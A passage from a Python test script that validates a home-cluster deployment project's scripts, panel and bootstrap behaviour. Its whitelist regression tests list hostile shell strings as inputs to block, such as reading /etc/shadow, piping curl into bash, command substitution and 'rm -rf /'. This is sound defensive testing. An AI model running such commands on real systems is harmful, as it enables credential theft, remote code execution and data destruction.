                log_fail(f"存在硬编码路径匹配: {pattern}")
        
        if not has_hardcoded:
            log_pass("未发现硬编码路径")
        
        # 检查可移植性
        if 'NODE_NAME=' in content:
            log_pass("有 NODE_NAME 变量")
        
        if 'NODE_NAME:-wk-edge-01' in content:
            log_pass("NODE_NAME 支持默认值")
        
        # 检查 systemd 服务文件生成
        if 'systemd/system' in content:
            log_pass("生成 systemd 服务文件")
        
        if 'ExecStart' in content:
            log_pass("服务有 ExecStart 配置")
        
        if 'WorkingDirectory' in content:
            log_pass("服务有 WorkingDirectory 配置")
    
    except Exception as e:
        log_fail(f"panel/install-service.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试11: 节点服务与 services.yaml 一致性 ============
def test_service_consistency():
    """验证节点服务配置一致性"""
    print("\n" + "="*60)
    print("测试 11: 节点服务配置一致性验证")
    print("="*60)
    
    try:
        # 读取 services.yaml
        with open(INVENTORY_DIR / "services.yaml", encoding='utf-8') as f:
            services_text = f.read()
        services_data = simple_yaml_parse(services_text)
        
        # 读取 panel config.json
        with open(PANEL_DIR / "config.json", encoding='utf-8') as f:
            panel_data = json.load(f)
        
        # 交叉验证
        log_info("交叉验证 services.yaml 与 panel/config.json:")
        
        yaml_services = services_data.get("services", {})
        panel_services = {}
        
        for node in panel_data.get("nodes", []):
            node_name = node["name"]
            svc_names = {s["name"] for s in node.get("services", [])}
            panel_services[node_name] = svc_names
        
        for node_name, panel_svcs in panel_services.items():
            yaml_node_svcs = {
                name for name, config in yaml_services.items()
                if config.get("node") == node_name
            }
            
            missing_in_panel = yaml_node_svcs - panel_svcs
            extra_in_panel = panel_svcs - yaml_node_svcs
            
            if not missing_in_panel and not extra_in_panel:
                log_pass(f"节点 {node_name}: services.yaml 与 panel 一致")
            else:
                if missing_in_panel:
                    log_warn(f"节点 {node_name}: panel 缺少服务 {missing_in_panel}")
                if extra_in_panel:
                    log_warn(f"节点 {node_name}: panel 多出服务 {extra_in_panel}")
        
        # 验证端口配置
        log_info("验证服务端口配置:")
        for svc_name, svc_config in yaml_services.items():
            if svc_config.get("container"):
                ports = svc_config.get("ports", [])
                for port_entry in ports:
                    port = port_entry.split(":")[0] if ":" in port_entry else port_entry
                    log_info(f"  {svc_name}: 端口 {port}")
    
    except Exception as e:
        log_fail(f"服务一致性验证错误: {str(e)}")
        return False
    
    return True

# ============ 测试12: 生成测试报告 ============
def generate_report():
    """生成测试报告"""
    print("\n" + "="*60)
    print("测试报告")
    print("="*60)
    
    total = PASSED + FAILED + WARNINGS
    
    print(f"\n  总计: {total} 项")
    print(color(f"  通过: {PASSED}", GREEN))
    print(color(f"  失败: {FAILED}", RED))
    print(color(f"  警告: {WARNINGS}", YELLOW))
    
    if FAILED == 0:
        print(f"\n  {color('[OK] 所有关键测试通过！', GREEN)}")
    else:
        print(f"\n  {color(f'[FAIL] 有 {FAILED} 项测试失败，需要修复', RED)}")
    
    # 显示所有警告
    warnings = [(name, detail) for status, name, detail in TEST_RESULTS if status == "WARN"]
    if warnings:
        print(f"\n  警告列表 ({len(warnings)} 项):")
        for name, detail in warnings:
            print(f"    - {name}")
            if detail:
                print(f"      {detail}")
    
    # 显示所有失败
    failures = [(name, detail) for status, name, detail in TEST_RESULTS if status == "FAIL"]
    if failures:
        print(f"\n  失败列表 ({len(failures)} 项):")
        for name, detail in failures:
            print(f"    - {name}")
            if detail:
                print(f"      {detail}")
    
    # 保存报告
    report_file = PROJECT_ROOT / "test_report.txt"
    with open(report_file, "w", encoding="utf-8") as f:
        f.write("OneCloud Cluster 验证报告\n")
        f.write("=" * 60 + "\n")
        f.write(f"通过: {PASSED}\n")
        f.write(f"失败: {FAILED}\n")
        f.write(f"警告: {WARNINGS}\n")
        f.write(f"总计: {total}\n\n")
        
        f.write("详细结果:\n")
        f.write("-" * 60 + "\n")
        for status, name, detail in TEST_RESULTS:
            f.write(f"[{status}] {name}")
            if detail:
                f.write(f" - {detail}")
            f.write("\n")
    
    log_info(f"报告已保存到: {report_file}")
    
    return FAILED == 0

# ============ 测试12: 文档化 CLI 接口契约验证 ============
def test_cli_contract():
    """验证 README / 运维手册中记载的命令行接口确实被实现

    之前的验证只检查语法和字符串存在性, 导致"文档写了但脚本没实现"
    的问题无法被发现 (例如 deploy.sh --exec、wireguard-setup.sh add peer)。
    本测试专门守住这些契约。
    """
    print("\n" + "="*60)
    print("测试 12: 文档化 CLI 接口契约验证")
    print("="*60)

    def read(path):
        p = Path(path)
        return p.read_text(encoding="utf-8", errors="ignore") if p.exists() else ""

    # ---- bootstrap.sh: --node/--ip/--hostname/--sd/--yes ----
    boot = read(SCRIPTS_DIR / "bootstrap.sh")
    for opt in ("--node", "--ip", "--hostname", "--sd", "--yes"):
        if re.search(rf'^\s*-[a-zA-Z\|]*{re.escape(opt.lstrip("-")[0])}\|--?{re.escape(opt.lstrip("-"))}\b', boot, re.M) or opt in boot:
            log_pass(f"bootstrap.sh 支持 {opt}")
        else:
            log_fail(f"bootstrap.sh 缺少 {opt}", "README 记载的初始化用法会失效")

    # ---- deploy.sh ----
    dep = read(SCRIPTS_DIR / "deploy.sh")
    for opt in ("--exec", "--node", "--test", "--dry-run"):
        if opt in dep:
            log_pass(f"deploy.sh 支持 {opt}")
        else:
            log_fail(f"deploy.sh 缺少 {opt}", f"README 记载的 {opt} 会报'未知选项'")

    # -n 必须按节点表查找, 而不是把参数直接当 NAME|IP|ROLE 记录解析
    if "node_selected" in dep:
        log_pass("deploy.sh -n 按节点表解析节点名")
    else:
        log_fail("deploy.sh -n 未做节点名映射", "-n wk-edge-01 会解析出空 IP")

    # ---- wireguard-setup.sh ----
    wg = read(SCRIPTS_DIR / "wireguard-setup.sh")
    if "cmd_add_peer" in wg and re.search(r'^\s*peer\)', wg, re.M):
        log_pass("wireguard-setup.sh 实现 'add peer' 子命令")
    else:
        log_fail("wireguard-setup.sh 缺少 'add peer'", "运维手册 5.2 的用法不可用")
    if re.search(r'^\s*list\|ls\)', wg, re.M):
        log_pass("wireguard-setup.sh 实现 'list' 子命令")
    else:
        log_fail("wireguard-setup.sh 缺少 'list'")
    # 产物必须落到 deploy.sh 能分发的 node-<name>/wireguard/
    if "node-${name}/wireguard/wg0.conf" in wg:
        log_pass("wireguard-setup.sh 输出到 node-<name>/wireguard/wg0.conf")
    else:
        log_fail("wireguard-setup.sh 输出目录与 deploy.sh 分发路径不一致")

    # ---- restore.sh: 支持 <备份ID> <节点名或服务名> 简写 ----
    rst = read(SCRIPTS_DIR / "restore.sh")
    if "RESTORE_TARGET" in rst and "无法识别的恢复目标" in rst:
        log_pass("restore.sh 支持 <备份ID> <目标> 简写形式")
    else:
        log_fail("restore.sh 不支持简写形式", "运维手册 3.3 的用法会落到 usage")
    if "normalize_node" in rst:
        log_pass("restore.sh 支持节点简写 (edge-01 -> wk-edge-01)")
    else:
        log_fail("restore.sh 未做节点名归一化")

    # ---- update-all.sh: 必须过滤 apt list 的 "Listing..." 表头 ----
    upd = read(SCRIPTS_DIR / "update-all.sh")
    if "upgradable from" in upd and ("awk -F'/'" in upd or "NF>1" in upd):
        log_pass("update-all.sh 过滤 apt list 表头")
    else:
        log_fail("update-all.sh 会把 'Listing... Done' 当包名传给 apt upgrade")

    # ---- install-services.sh: PEP 668 兼容 ----
    ins = read(SCRIPTS_DIR / "install-services.sh")
    if "--break-system-packages" in ins:
        log_pass("install-services.sh 兼容 PEP 668 (externally-managed)")
    else:
        log_fail("install-services.sh 在 Debian 12+ 上 pip3 安装会失败")

    # ---- generate-keys.sh: PostUp/PostDown 各只能有一条 ----
    gk = read(NODE_DIRS["wk-edge-01"] / "wireguard" / "generate-keys.sh")
    n_up = len([l for l in gk.splitlines() if l.strip().startswith("PostUp")])
    n_down = len([l for l in gk.splitlines() if l.strip().startswith("PostDown")])
    if n_up <= 1 and n_down <= 1:
        log_pass(f"generate-keys.sh PostUp/PostDown 各 {n_up}/{n_down} 条 (无覆盖)")
    else:
        log_fail(
            f"generate-keys.sh PostUp/PostDown 重复 ({n_up}/{n_down})",
            "wg-quick 只保留最后一条, NAT 规则会被静默丢弃"
        )

    # ---- services.yaml: 不得同时声明 ports 与 network_mode: host ----
    svc_text = read(INVENTORY_DIR / "services.yaml")
    blocks = re.split(r'\n(?=  [a-z0-9_-]+:\s*$)', svc_text)
    conflict_found = False
    for b in blocks:
        m = re.match(r'\s{2}([a-z0-9_-]+):', b)
        if not m:
            continue
        name = m.group(1)
        has_ports = re.search(r'^\s{4}ports:\s*$', b, re.M) is not None
        has_host = re.search(r'^\s{4}network_mode:\s*host\s*$', b, re.M) is not None
        if has_ports and has_host:
            log_fail(f"services.yaml: {name} 同时声明 ports 与 network_mode: host", "docker compose 会拒绝")
            conflict_found = True
    if not conflict_found:
        log_pass("services.yaml 无 ports/network_mode 冲突")

    log_info("CLI 契约检查完成")


# ============ 测试13: 节点 IP 可自定义 / 主机名齐全 ============
def test_ip_customizable():
    """验证: 节点 IP 全部来自清单 (可自定义), 每个节点都有 hostname, 脚本无硬编码旧文档 IP"""
    print("\n" + "="*60)
    print("测试 13: 节点 IP 自定义与主机名完整性")
    print("="*60)

    # 1) 每个节点必须有 hostname (带默认值) 与 ip
    try:
        with open(INVENTORY_DIR / "nodes.yaml", encoding='utf-8') as f:
            nodes_data = simple_yaml_parse(f.read())
        nodes = nodes_data.get("nodes", [])
        if not nodes:
            log_fail("nodes.yaml 未解析出节点")
        for node in nodes:
            name = node.get("name", "?")
            if not node.get("hostname"):
                log_fail(f"节点 {name} 缺少 hostname 字段 (每个节点都必须设定 hostname)")
            else:
                log_pass(f"节点 {name} 主机名: {node['hostname']} (可自定义)")
            if not node.get("ip"):
                log_fail(f"节点 {name} 缺少 ip 字段")
            else:
                log_pass(f"节点 {name} IP: {node['ip']} (来自清单, 可覆盖)")
    except Exception as e:
        log_fail(f"解析 nodes.yaml 失败: {str(e)}")

    # 2) 核心功能脚本不得硬编码旧文档里的 192.168.1.10x / 10.8.0.10x
    core_scripts = [
        "deploy.sh", "update-all.sh", "health-check.sh", "backup.sh",
        "restore.sh", "bootstrap.sh", "setup.sh", "install-services.sh",
        "wireguard-setup.sh",
    ]
    import subprocess
    for script in core_scripts:
        path = SCRIPTS_DIR / script
        if not path.exists():
            continue
        content = path.read_text(encoding='utf-8')
        # 去掉注释行后再查 (避免 help/示例注释误报)
        code_lines = [
            ln for ln in content.splitlines()
            if not ln.strip().startswith("#")
        ]
        code = "\n".join(code_lines)
        hits = re.findall(r'(?:192\.168\.1\.10[0-9]|10\.8\.0\.10[0-9])', code)
        if hits:
            log_fail(f"{script} 仍硬编码旧 IP: {sorted(set(hits))}",
                     "节点 IP 应从 inventory/nodes.yaml 读取, 以支持自定义网络")
        else:
            log_pass(f"{script} 无硬编码节点 IP (IP 全部来自清单)")

    # 4) 节点 .env 生成器可用 (把自定义 IP 贯通到容器运行时)
    if (SCRIPTS_DIR / "gen-node-env.sh").exists():
        r = subprocess.run(["bash", str(SCRIPTS_DIR / "gen-node-env.sh"), "--dry-run"],
                           capture_output=True, text=True, cwd=str(PROJECT_ROOT))
        if r.returncode == 0 and "NODE_IP=" in r.stdout:
            log_pass("gen-node-env.sh 可渲染节点 .env (自定义 IP 贯通到容器)")
        else:
            log_fail("gen-node-env.sh 渲染失败", r.stderr[:120])
    else:
        log_fail("缺少 scripts/gen-node-env.sh")


def test_safety_regression():
    """测试 14: 安全与健壮性回归 (已修缺陷不得复现)"""
    print("\n" + "="*60)
    print("测试 14: 安全与健壮性回归")
    print("="*60)

    # 1) restore.sh: 'latest' 且无备份时必须报错, 不能退化成备份根目录
    restore = SCRIPTS_DIR / "restore.sh"
    if restore.exists():
        src = restore.read_text(encoding="utf-8")
        if 'BACKUP_ID" = "latest"' in src and "没有可用备份" in src:
            log_pass("restore.sh 对 latest 无备份场景有守卫")
        else:
            log_fail("restore.sh 缺少 latest 空备份守卫",
                     "否则 BACKUP_PATH 会退化成备份根目录, 误恢复整个备份目录")

    # 2) 原生安装器: 下载产物须校验 + root 检查
    inst = SCRIPTS_DIR / "install-services.sh"
    if inst.exists():
        src = inst.read_text(encoding="utf-8")
        if "is_elf_binary" in src:
            log_pass("install-services.sh 校验下载产物为可执行文件")
        else:
            log_fail("install-services.sh 未校验下载产物", "404 页面可能被当成安装成功")
        if "require_root" in src:
            log_pass("install-services.sh 对原生安装有 root 权限检查")
        else:
            log_fail("install-services.sh 缺少 root 权限检查")

    # 3) setup.sh: 二进制下载同样需要校验
    setup = SCRIPTS_DIR / "setup.sh"
    if setup.exists():
        src = setup.read_text(encoding="utf-8")
        if "is_elf_binary" in src:
            log_pass("setup.sh 校验二进制下载产物")
        else:
            log_fail("setup.sh 未校验二进制下载产物")

    # 4) 节点内重复安装器应委派到统一脚本, 不得各自实现
    dup = {
        "node-wk-edge-01/clash/install-binary.sh": "mihomo",
        "node-wk-iot-02/xiaomusic/install.sh": "xiaomusic",
    }
    for rel, target in dup.items():
        p = PROJECT_ROOT / rel
        if not p.exists():
            continue
        src = p.read_text(encoding="utf-8")
        if "install-services.sh" in src and target in src:
            log_pass(f"{rel} 已委派统一安装脚本 (无重复实现)")
        else:
            log_fail(f"{rel} 仍在重复实现安装逻辑", "易与 install-services.sh 产生行为分叉")

    # 5) 面板命令白名单: 必须拦住 shell 元字符 (前缀匹配可被 'cmd; evil' 绕过)
    app = PANEL_DIR / "app.py"
    if app.exists():
        try:
            src = app.read_text(encoding="utf-8")
            seg = src[src.index("ALLOWED_CMD_PREFIXES"):src.index("def load_config")]
            ns = {}
            exec(seg, ns)
            safe = ns["is_command_safe"]
            must_pass = ["free -h", "df -h", "docker ps", "uptime", "cat /proc/loadavg"]
            must_block = ["free; cat /etc/shadow", "uptime && curl http://x|bash",
                          "ls `whoami`", "date $(id)", "rm -rf /"]
            bad = [c for c in must_pass if not safe(c)] + [c for c in must_block if safe(c)]
            if not bad:
                log_pass("面板命令白名单: 正常命令放行, 元字符与危险命令被拦截")
            else:
                log_fail(f"面板命令白名单判定异常: {bad}")
        except Exception as e:
            log_fail(f"面板白名单校验失败: {e}")


def test_panel_frontend_contract():
    """测试 15: 面板前端与后端契约 (前端调用必须真实存在, 且方法/参数匹配)"""
    print("\n" + "="*60)
    print("测试 15: 面板前端与后端契约")
    print("="*60)

    js = PANEL_DIR / "static" / "js" / "app.js"
    app = PANEL_DIR / "app.py"
    if not js.exists() or not app.exists():
        log_fail("面板前端或后端文件缺失")
        return

    js_src = js.read_text(encoding="utf-8")
    py_src = app.read_text(encoding="utf-8")

    # 1) 前端引用的 API 端点必须在后端有定义
    endpoints = sorted(set(re.findall(r'fetch\(\s*[`"\'](/api/[a-zA-Z_/]*)', js_src)))
    missing = [ep for ep in endpoints if ep.rstrip("/") not in py_src]
    if missing:
        log_fail(f"前端调用了后端不存在的接口: {missing}")
    else:
        log_pass(f"前端引用的 {len(endpoints)} 个 API 端点后端均已定义")

    # 2) 服务操作必须是 POST (后端 methods=["POST"], 用 GET 会 405)
    sidx = js_src.find("async function serviceAction")
    sbody = js_src[sidx:js_src.find("async function nodeAction")] if sidx >= 0 else ""
    if 'method: "POST"' in sbody:
        log_pass('serviceAction 使用 POST (与后端 methods=["POST"] 匹配)')
    else:
        log_fail("serviceAction 未使用 POST", "后端只接受 POST, 否则启停/重启/日志全部 405")

    # 3) 集群 docker_* 操作必须真正下发请求, 不能只弹提示
    cidx = js_src.find("async function clusterAction")
    cbody = js_src[cidx:js_src.find("async function execCmd")] if cidx >= 0 else ""
    if "/api/node/" in cbody and "JSON.stringify({action})" in cbody:
        log_pass("集群 docker_up/down/pull 会对各节点真实下发请求")
    else:
        log_fail("集群批量操作只弹提示未调用 API", "按钮点了没有任何实际效果")

    # 4) 日志操作必须把内容展示出来, 而不是只提示成功
    if '"logs"' in sbody and "execOutput" in sbody:
        log_pass("服务日志操作会输出日志内容 (而非只提示成功)")
    else:
        log_fail("日志操作未展示输出", "点击日志按钮看不到任何内容")

    # 5) 白名单必须允许裸 ls (曾写成 'ls ' 带尾空格, 导致 ls 被拒)
    try:
        seg = py_src[py_src.index("ALLOWED_CMD_PREFIXES"):py_src.index("def load_config")]
        ns = {}
        exec(seg, ns)
        safe = ns["is_command_safe"]
        if safe("ls") and safe("ls /mnt/sd") and not safe("ls && rm -rf /"):
            log_pass("命令白名单允许裸 ls 且仍拦截拼接命令")
        else:
            log_fail("白名单对 ls 的判定不符合预期")
    except Exception as e:
        log_fail(f"白名单 ls 校验失败: {e}")


def test_bootstrap_network_resolution():
    """测试 16: bootstrap 网络取值 (IP/网关联动 + 本机探测 + 来源标注)"""
    print("\n" + "=" * 60)
    print("测试 16: bootstrap 网络取值与网关联动")
    print("=" * 60)

    boot = PROJECT_ROOT / "scripts" / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")

    def run_boot(args, env_extra=None):
        env = dict(os.environ)
        env["ONECLOUD_BOOTSTRAP_TTY"] = "0"   # 强制非交互, 避免测试环境差异
        if env_extra:
            env.update(env_extra)
        return subprocess.run(
            ["bash", str(boot)] + args,
            capture_output=True, text=True, encoding="utf-8",
            errors="replace", env=env, cwd=str(boot.parent),
            stdin=subprocess.DEVNULL,
        )

    def parse_net(out):
        ip_m = re.search(r"静态IP:\s+(\S+)\s+\(来源:\s*([^)]+)\)", out)
        gw_m = re.search(r"网关:\s+(\S+)\s+\(来源:\s*([^)]+)\)", out)
        return (ip_m.groups() if ip_m else None, gw_m.groups() if gw_m else None)

    # 1) 网段推导函数: 由 IP+前缀 得到 "<网络地址> <网关>"
    cases = [("192.168.6.101", "24", "192.168.6.0 192.168.6.1"),
             ("10.0.0.5", "8", "10.0.0.0 10.0.0.1"),
             ("172.16.5.9", "16", "172.16.0.0 172.16.0.1")]
    bad = []
    for ip, prefix, expect in cases:
        r = subprocess.run(
            ["bash", "-c",
             'source <(sed -n "/^ip_net_info()/,/^}/p" "$1"); ip_net_info ' + ip + " " + prefix,
             "_", str(boot)],
            capture_output=True, text=True, encoding="utf-8", errors="replace")
        if r.stdout.strip() != expect:
            bad.append(f"{ip}/{prefix} -> {r.stdout.strip()!r}")
    if bad:
        log_fail(f"网段推导结果错误: {'; '.join(bad)}")
    else:
        log_pass("网段推导函数正确 (/24 /8 /16 均得到网络地址+1 的网关)")

    # 2) 传 --ip 换网段: 网关必须跟着变, 不能停留在清单默认值
    r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.6.101",
                  "--hostname", "edge-01", "--dry-run"])
    (ip_val, ip_src), (gw_val, gw_src) = parse_net(r.stdout)
    if gw_val == "192.168.6.1" and "推导" in (gw_src or ""):
        log_pass("--ip 换网段后网关自动跟随 (192.168.1.1 -> 192.168.6.1)")
    else:
        log_fail(f"--ip 换网段后网关未跟随: 网关={gw_val} 来源={gw_src}",
                 "换网段后网关仍是清单默认值会导致配置完无法联网")

    # 3) 显式 --gateway 不被推导覆盖
    r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.6.101",
                  "--gateway", "192.168.6.254", "--dry-run"])
    _, (gw_val, gw_src) = parse_net(r.stdout)
    if gw_val == "192.168.6.254" and "命令行" in (gw_src or ""):
        log_pass("显式 --gateway 不被自动推导覆盖 (尊重明确意图)")
    else:
        log_fail(f"显式 --gateway 被覆盖: {gw_val} ({gw_src})")

    # 4) 未换网段时保留清单网关 (不能瞎改)
    r = run_boot(["--node", "wk-edge-01", "--dry-run"])
    _, (gw_val, gw_src) = parse_net(r.stdout)
    if gw_val == "192.168.1.1" and "清单" in (gw_src or ""):
        log_pass("IP 未变更时网关保持清单值 (192.168.1.1)")
    else:
        log_fail(f"IP 未变更时网关异常: {gw_val} ({gw_src})")

    # 5) 本机探测能力 + 可关闭
    has_detect = "detect_current_network()" in src and "--no-detect" in src
    has_dry = "--dry-run" in src
    if has_detect and has_dry:
        log_pass("具备本机网络探测 (--no-detect 可关闭) 与 --dry-run 预览")
    else:
        missing = [n for n, ok in [("detect_current_network", "detect_current_network()" in src),
                                   ("--no-detect", "--no-detect" in src),
                                   ("--dry-run", has_dry)] if not ok]
        log_fail(f"缺少: {missing}")

    # 6) 配置确认页必须标注取值来源
    if "来源: ${IP_SOURCE}" in src and "来源: ${GW_SOURCE}" in src:
        log_pass("配置确认页标注了 IP/网关的取值来源")
    else:
        log_fail("配置确认页未标注来源", "用户无法判断值来自命令行、探测还是清单")

    # 7) 文档同步: README 需说明优先级与网关联动
    readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    if "由最终 IP 推导" in readme and "自动探测当前设备" in readme:
        log_pass("README 已记录 IP/网关取值优先级与探测行为")
    else:
        log_fail("README 未说明新的取值规则", "文档与实际行为会漂移")


def test_bootstrap_sd_and_risk():
    """测试 17: bootstrap 启动探测 / SD 卡决策 / 写入前网络风险提示"""
    print("\n" + "=" * 60)
    print("测试 17: bootstrap SD 卡决策与网络风险提示")
    print("=" * 60)

    boot = PROJECT_ROOT / "scripts" / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")

    # 1) 探测必须发生在参数解析之前 (否则无法用于后续比对)
    i_detect = src.find("detect_current_network\n")
    i_args = src.find("while [[ $# -gt 0 ]]")
    if 0 <= i_detect < i_args:
        log_pass("启动即探测本机 IP/网关 (早于参数解析)")
    else:
        log_fail("本机探测未放在参数解析之前", "后续网段比对会拿不到当前网络")

    # 2) SD 探测函数与"无卡跳过"路径存在
    needed = ["detect_sd_cards()", "未检测到 SD 卡", "SD_CANDIDATES"]
    missing = [n for n in needed if n not in src]
    if not missing:
        log_pass("具备 SD 卡探测与无卡跳过逻辑")
    else:
        log_fail(f"缺少 SD 卡处理: {missing}")

    # ---- 用 mock 环境做行为验证 ----
    # 注意: Git Bash 的 PATH 查找只认 POSIX 路径 (/c/...), 不认 C:/...
    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t17_"))
    probe = SCRIPTS_DIR / "_probe_t17.sh"
    harness = tmpdir / "harness.sh"

    harness.write_text(f"""#!/bin/bash
set -u
BOOT="{_posix(boot)}"
PROBE="{_posix(probe)}"
M="{_posix(tmpdir)}/mockbin"
mkdir -p "$M"

cat > "$M/ip" << 'MOCKEOF'
#!/bin/bash
if [ "$1" = "-4" ] && [ "$2" = "-o" ]; then
    echo "2: eth0    inet 192.168.6.50/24 brd 192.168.6.255 scope global eth0"
    exit 0
fi
if [ "$1" = "route" ]; then
    echo "default via 192.168.6.1 dev eth0 proto dhcp src 192.168.6.50 metric 100"
    exit 0
fi
exit 0
MOCKEOF

cat > "$M/findmnt" << 'MOCKEOF'
#!/bin/bash
echo "/dev/mmcblk0p1"
MOCKEOF

cat > "$M/lsblk" << 'MOCKEOF'
#!/bin/bash
echo "mmcblk0  0 disk"
[ "${{MOCK_NO_SD:-0}}" = "1" ] || echo "mmcblk1  1 disk"
exit 0
MOCKEOF

cat > "$M/ping" << 'MOCKEOF'
#!/bin/bash
t="${{@: -1}}"
case "${{MOCK_PING_MODE:-gw}}" in
    all)  exit 0 ;;
    none) exit 1 ;;
    gw)   [ "$t" = "192.168.6.1" ] && exit 0 || exit 1 ;;
esac
MOCKEOF
chmod +x "$M"/*

# 截取到"设置主机名"之前: 只跑参数/探测/SD决策/风险提示, 绝不改动系统
LN=$(grep -n '^# ---- 2\\. 设置主机名 ----' "$BOOT" | cut -d: -f1)
sed -n "1,${{LN}}p" "$BOOT" > "$PROBE"

run() {{
    local tag="$1" nose="$2" ping="$3"
    shift 3
    echo "###CASE:$tag"
    ( cd "$(dirname "$PROBE")" \\
      && MOCK_NO_SD="$nose" MOCK_PING_MODE="$ping" PATH="$M:$PATH" \\
         bash "$(basename "$PROBE")" "$@" </dev/null 2>&1 )
}}

run sd_no_card 1 gw --node wk-edge-01 --ip 192.168.6.101 --dry-run
run sd_present 0 gw --node wk-edge-01 --ip 192.168.6.101 --dry-run
run sd_disabled 0 gw --node wk-edge-01 --ip 192.168.6.101 --no-sd --dry-run
run sd_noauto 0 gw --node wk-edge-01 --ip 192.168.6.101 --no-sd-automount --dry-run
run cross_seg 0 gw --node wk-edge-01 --ip 10.0.0.9 --dry-run
run ip_clash 0 all --node wk-edge-01 --ip 192.168.6.101 --dry-run
run nodetect 0 gw --node wk-edge-01 --ip 10.0.0.9 --no-detect --dry-run

rm -f "$PROBE"
""", encoding="utf-8")

    try:
        r = subprocess.run(["bash", str(harness)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=180)
        out = r.stdout

        def case(tag):
            m = re.search(rf"###CASE:{tag}\n(.*?)(?=\n###CASE:|\Z)", out, re.S)
            return m.group(1) if m else ""

        c = case("sd_no_card")
        if "未检测到 SD 卡" in c and "将跳过" in c and "将迁移" not in c:
            log_pass("未插卡时跳过 SD 挂载与 Docker 迁移")
        else:
            log_fail("未插卡仍执行了 SD 相关步骤", c[:200])

        c = case("sd_present")
        if "将挂载" in c and "将迁移" in c and "/mnt/sd/docker" in c:
            log_pass("检测到 SD 卡后展示挂载与 Docker 迁移计划")
        else:
            log_fail("有卡时未展示挂载计划", c[:200])

        c = case("sd_disabled")
        if "已指定 --no-sd" in c and "将跳过" in c:
            log_pass("--no-sd 完全跳过 SD 相关步骤")
        else:
            log_fail("--no-sd 未生效", c[:200])

        c = case("sd_noauto")
        if "不写入 fstab" in c and "(自动挂载: 否)" in c:
            log_pass("--no-sd-automount 挂载但不写 fstab")
        else:
            log_fail("--no-sd-automount 未生效", c[:200])

        c = case("cross_seg")
        if "不在同一网段" in c and "风险" in c:
            log_pass("新 IP 与当前 IP 跨网段时告警")
        else:
            log_fail("跨网段未告警", "配完静态 IP 可能直接失联")

        c = case("cross_seg")
        if "不可达" in c:
            log_pass("网关 ping 不通时告警")
        else:
            log_fail("网关不可达未告警", c[:200])

        c = case("ip_clash")
        if "已被占用" in c:
            log_pass("目标 IP 已被占用时告警")
        else:
            log_fail("IP 冲突未告警", c[:200])

        c = case("nodetect")
        if "10.0.0.9" in c and "不在同一网段" in c:
            log_pass("--no-detect 仅停用自动采用, 仍做网段比对")
        else:
            log_fail("--no-detect 关闭了风险比对", c[:200])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
        if probe.exists():
            probe.unlink()

    # 3) --help 不应触发探测
    r = subprocess.run(["bash", str(boot), "--help"], capture_output=True, text=True,
                       encoding="utf-8", errors="replace", stdin=subprocess.DEVNULL)
    if "本机当前网络:" not in r.stdout:
        log_pass("--help 直接输出用法, 不触发探测")
    else:
        log_fail("--help 触发了探测", "只查用法却去扫网络/磁盘")

    # 4) 文档同步
    doc_a = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    doc_b = (SCRIPTS_DIR / "README.md").read_text(encoding="utf-8")
    ok_a = ("--no-sd" in doc_a) and ("SD 卡处理" in doc_a) and ("网络安全检查" in doc_a)
    ok_b = ("--no-sd" in doc_b) and ("启动即探测" in doc_b)
    if ok_a and ok_b:
        log_pass("README 与 scripts/README 已同步新参数与新行为")
    else:
        log_fail(f"文档未同步 (README={ok_a}, scripts/README={ok_b})",
                 "用户不知道有 --no-sd 等开关")


# ============ 测试18: init 交互式入口 ============
def test_init_entrypoint():
    """测试 18: init/ 交互式入口契约 (纯交互 / 无默认参数 / 菜单齐全 / 引用脚本存在)"""
    print("\n" + "="*60)
    print("测试 18: init 交互式入口")
    print("="*60)

    init_dir = PROJECT_ROOT / "init"
    entry = init_dir / "init.sh"
    init_readme = init_dir / "README.md"

    if not entry.exists():
        log_fail("init/init.sh 不存在", "缺少交互式初始化入口")
        return
    log_pass("init/init.sh 存在")

    src = entry.read_text(encoding="utf-8")

    # 1) 基本结构
    if src.startswith("#!/bin/bash"):
        log_pass("init.sh 有 bash shebang")
    else:
        log_fail("init.sh 缺少 bash shebang")

    if "set -u" in src:
        log_pass("init.sh 启用 set -u（未定义变量尽早暴露）")
    else:
        log_fail("init.sh 未启用 set -u")

    # 2) 语法检查
    bash = shutil.which("bash")
    if bash:
        r = subprocess.run([bash, "-n", str(entry)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace")
        if r.returncode == 0:
            log_pass("init.sh 通过 bash -n 语法检查")
        else:
            log_fail(f"init.sh 语法错误: {r.stderr.strip()[:200]}")
    else:
        log_warn("未找到 bash，跳过 init.sh 语法检查")

    # 3) 纯交互：拒绝命令行参数、不预置 --yes
    if re.search(r'\[\s*"\$#"\s*-gt\s*0\s*\]', src) and "不接受任何命令行参数" in src:
        log_pass("init.sh 显式拒绝命令行参数（纯交互）")
    else:
        log_fail("init.sh 未拒绝命令行参数", "纯交互约定要求传入参数即报错退出")

    # 只看可执行代码：注释里说明"不预置 --yes"是正常表述, 不算违规
    code = "\n".join(ln for ln in src.splitlines() if not ln.lstrip().startswith("#"))

    if "--yes" not in code:
        log_pass("init.sh 未预置 --yes 等默认参数")
    else:
        log_fail("init.sh 出现 --yes", "与「不采用任何默认参数」的约定冲突")

    if "[Y/n]" not in code and "[y/N]" not in code:
        log_pass("确认提问不提供回车默认值（必须显式输入 y/n）")
    else:
        log_fail("存在 [Y/n] 式隐式默认值", "回车即采用的默认与纯交互约定不符")

    # 4) 交互基础函数齐全
    need_fns = ["menu", "read_input", "read_secret", "ask_yes_no", "pick_node", "run_script", "pause"]
    missing_fns = [fn for fn in need_fns
                   if not re.search(r'^' + re.escape(fn) + r'\(\)\s*\{', src, re.MULTILINE)]
    if missing_fns:
        log_fail(f"init.sh 缺少交互函数: {missing_fns}")
    else:
